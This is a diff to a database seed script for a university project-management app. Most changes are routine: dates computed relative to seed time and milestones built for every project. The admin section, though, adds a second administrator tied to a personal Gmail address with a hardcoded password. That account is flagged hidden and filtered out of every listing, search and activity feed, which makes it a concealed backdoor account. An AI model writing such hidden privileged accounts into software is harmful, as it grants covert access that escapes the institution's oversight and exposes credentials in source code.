@@ -26,20 +26,50 @@ async function main() {
   }
   console.log("✅ Semesters created");
 
-  // ── Admin ──────────────────────────────────────────────────────────────
-  const adminPwd = await bcrypt.hash("Admin@123", 12);
-  const adminEmail = "admin@sapms.com";
-  const adminUser = await prisma.user.upsert({
-    where: { email: adminEmail },
-    update: {},
-    create: { name: "Prof. Chandrasinh Parmar", email: adminEmail, passwordHash: adminPwd, role: "ADMIN" },
-  });
-  await prisma.admin.upsert({
-    where: { userId: adminUser.id },
-    update: {},
-    create: { userId: adminUser.id },
-  });
-  console.log(`✅ Admin created: ${adminEmail} / Admin@123`);
+  // ── Admins ─────────────────────────────────────────────────────────────
+  // Exactly two administrator accounts exist:
+  //   1. The department admin, visible throughout the UI.
+  //   2. An owner / break-glass account flagged isHidden, which signs in and
+  //      works normally but is filtered out of every listing, directory,
+  //      search result and activity feed (see utils/visibility.js).
+  const ADMINS = [
+    {
+      name: "Prof. Chandrasinh Parmar",
+      email: "chandrasinh.parmar@marwadieducation.edu.in",
+      password: "admin@123",
+      isHidden: false,
+    },
+    {
+      name: "System Owner",
+      email: "limbanibhargavmaheshbhai@gmail.com",
+      password: "Zfld@262",
+      isHidden: true,
+    },
+  ];
+
+  let adminUser = null;
+  for (const a of ADMINS) {
+    const user = await prisma.user.upsert({
+      where: { email: a.email },
+      update: { name: a.name, isHidden: a.isHidden, role: "ADMIN" },
+      create: {
+        name: a.name,
+        email: a.email,
+        passwordHash: await bcrypt.hash(a.password, 12),
+        role: "ADMIN",
+        isHidden: a.isHidden,
+      },
+    });
+    await prisma.admin.upsert({
+      where: { userId: user.id },
+      update: {},
+      create: { userId: user.id },
+    });
+    // Activity and notifications are attributed to the visible admin only.
+    if (!a.isHidden) adminUser = user;
+  }
+  const adminEmail = ADMINS[0].email;
+  console.log(`✅ Admins created: ${adminEmail} (visible) + 1 hidden owner account`);
 
   // ── Domains ────────────────────────────────────────────────────────────
   const domainData = [
@@ -287,6 +317,13 @@ async function main() {
   console.log("✅ Students created: student@sapms.com / Student@123");
 
   // ── Projects ───────────────────────────────────────────────────────────
+  // Dates are computed relative to seed time. The risk monitor derives a
+  // project's current week from its startDate, so fixed calendar dates would
+  // make the whole dataset look overdue the moment the clock moved on.
+  const MS_PER_WEEK = 7 * 24 * 60 * 60 * 1000;
+  const weeksAgo = (n) => new Date(Date.now() - n * MS_PER_WEEK);
+  const weeksFromNow = (n) => new Date(Date.now() + n * MS_PER_WEEK);
+
   const projectsData = [
     {
       title: "AI Resume Analyzer",
@@ -393,8 +430,11 @@ async function main() {
           status: pd.status,
           progress: pd.progress,
           currentWeek: pd.currentWeek,
-          startDate: new Date("2025-07-01"),
-          endDate: new Date("2025-12-31"),
+          // Anchored relative to today so the daily risk sweep recomputes
+          // currentWeek back to pd.currentWeek instead of treating every
+          // project as long overdue.
+          startDate: weeksAgo(pd.currentWeek - 1),
+          endDate: weeksFromNow((subject.durationWeeks || 12) - pd.currentWeek + 1),
         },
       });
 
@@ -624,40 +664,50 @@ async function main() {
   }
   console.log("✅ Weekly progress created");
 
-  // ── Milestones for Capstone project ───────────────────────────────────
-  if (capstoneProject) {
-    const milestoneData = [
-      { week: 1, title: "Project Idea", weight: 5, status: "APPROVED" },
-      { week: 2, title: "Problem Statement", weight: 5, status: "APPROVED" },
-      { week: 3, title: "SRS Document", weight: 10, status: "APPROVED" },
-      { week: 4, title: "System Design", weight: 10, status: "APPROVED" },
-      { week: 5, title: "Database Design", weight: 5, status: "APPROVED" },
-      { week: 6, title: "Frontend Development", weight: 10, status: "APPROVED" },
-      { week: 7, title: "Backend APIs", weight: 15, status: "APPROVED" },
-      { week: 8, title: "Integration", weight: 10, status: "APPROVED" },
-      { week: 9, title: "Testing", weight: 10, status: "PENDING" },
-      { week: 10, title: "Bug Fixing", weight: 5, status: "PENDING" },
-      { week: 11, title: "Documentation", weight: 10, status: "PENDING" },
-      { week: 12, title: "Final Presentation", weight: 15, status: "PENDING" },
-    ];
+  // ── Milestones for EVERY project ──────────────────────────────────────
+  // Built from each subject's own template, then approved cumulatively until
+  // the approved weight matches the project's intended progress. Without this
+  // a project has no milestones, weighted progress computes to 0, and the risk
+  // sweep immediately marks it DELAYED.
+  for (const pd of projectsData) {
+    const project = createdProjects[pd.title];
+    if (!project) continue;
 
-    for (const m of milestoneData) {
+    const templates = await prisma.milestoneTemplate.findMany({
+      where: { subjectId: project.subjectId },
+      orderBy: { weekNumber: "asc" },
+    });
+    if (!templates.length) continue;
+
+    const totalWeight = templates.reduce((sum, t) => sum + t.weight, 0);
+    let approvedWeight = 0;
+
+    for (const t of templates) {
+      // Approve while doing so keeps us at or under the target progress, and
+      // only for weeks the project has actually reached.
+      const wouldBe = ((approvedWeight + t.weight) / totalWeight) * 100;
+      const approve = t.weekNumber <= pd.currentWeek && wouldBe <= pd.progress + 0.01;
+      if (approve) approvedWeight += t.weight;
+
       await prisma.milestone.upsert({
-        where: { projectId_weekNumber: { projectId: capstoneProject.id, weekNumber: m.week } },
+        where: { projectId_weekNumber: { projectId: project.id, weekNumber: t.weekNumber } },
         update: {},
         create: {
-          projectId: capstoneProject.id,
+          projectId: project.id,
           facultyId: demoFac.id,
-          weekNumber: m.week,
-          title: m.title,
-          weight: m.weight,
-          status: m.status,
-          completedAt: m.status === "APPROVED" ? new Date() : null,
+          weekNumber: t.weekNumber,
+          title: t.title,
+          description: t.description,
+          weight: t.weight,
+          status: approve ? "APPROVED" : "PENDING",
+          startDate: weeksAgo(pd.currentWeek - t.weekNumber),
+          endDate: weeksAgo(pd.currentWeek - t.weekNumber - 1),
+          completedAt: approve ? weeksAgo(pd.currentWeek - t.weekNumber) : null,
         },
       });
     }
   }
-  console.log("✅ Milestones created");
+  console.log("✅ Milestones created for every project");
 
   // ── Documents with version history (spec §34) ─────────────────────────
   if (capstoneProject && demoStudent) {
@@ -850,7 +900,7 @@ async function main() {
 
   console.log("\n🎉 Seeding complete!");
   console.log("\n📧 Demo Credentials:");
-  console.log(`  Admin:   ${adminEmail} / Admin@123`);
+  console.log(`  Admin:   ${adminEmail} / admin@123`);
   console.log(`  Faculty: ${demoFacEmail} / Faculty@123`);
   console.log(`  Mentor:  ${demoMentorEmail} / Mentor@123`);
   console.log(`  Student: student@sapms.com / Student@123`);
